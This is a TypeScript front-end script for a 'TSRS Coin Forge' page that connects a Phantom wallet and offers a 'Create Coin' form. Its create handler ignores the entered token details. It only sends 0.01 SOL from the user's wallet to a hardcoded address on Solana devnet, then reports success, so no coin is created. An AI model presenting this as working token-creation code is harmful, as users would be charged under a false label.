document.addEventListener("DOMContentLoaded", () => {

  document.body.innerHTML = `
    <h1>TSRS Coin Forge 🚀</h1>
    <p>Frontend is LIVE</p>

    <button id="connectWallet">Connect Phantom Wallet</button>
    <p id="walletAddress"></p>

    <hr />

    <h2>Create Coin</h2>
    <input id="tokenName" placeholder="Token Name" /><br/><br/>
    <input id="tokenSymbol" placeholder="Token Symbol" /><br/><br/>
    <input id="tokenSupply" placeholder="Total Supply" /><br/><br/>

    <button id="createCoin">Create Coin</button>
    <p id="createStatus"></p>
  `

  const provider = (window as any).solana
  const solanaWeb3 = (window as any).solanaWeb3

  const connectBtn = document.getElementById("connectWallet") as HTMLButtonElement
  const walletText = document.getElementById("walletAddress")!
  const createBtn = document.getElementById("createCoin") as HTMLButtonElement
  const statusText = document.getElementById("createStatus")!

  const RECEIVER = "9kkjHiAYFryfFVuWfBY9XuvrEVdCGZmWqhUnRGwreso8"
  const FEE_LAMPORTS = 10_000_000

  // CONNECT
  connectBtn.onclick = async () => {
    if (!provider || !provider.isPhantom) {
      alert("Open inside Phantom browser")
      return
    }

    const res = await provider.connect()
    walletText.innerText = "Connected: " + res.publicKey.toString()
  }

  // CREATE COIN
  createBtn.onclick = async () => {
    try {
      const name = (document.getElementById("tokenName") as HTMLInputElement).value
      const symbol = (document.getElementById("tokenSymbol") as HTMLInputElement).value
      const supply = (document.getElementById("tokenSupply") as HTMLInputElement).value

      if (!name || !symbol || !supply) {
        statusText.innerText = "Fill all fields"
        return
      }

      if (!provider || !provider.publicKey) {
        statusText.innerText = "Connect wallet first"
        return
      }

      statusText.innerText = "Preparing transaction..."

      const connection = new solanaWeb3.Connection(
        "https://api.devnet.solana.com",
        "confirmed"
      )

      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: new solanaWeb3.PublicKey(RECEIVER),
          lamports: FEE_LAMPORTS,
        })
      )

      transaction.feePayer = provider.publicKey

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash

      const signed = await provider.signTransaction(transaction)
      const signature = await connection.sendRawTransaction(signed.serialize())

      await connection.confirmTransaction(signature)

      statusText.innerText = "✅ Success TX: " + signature

    } catch (err: any) {
      console.error(err)
      statusText.innerText = "Error: " + err.message
    }
  }

})
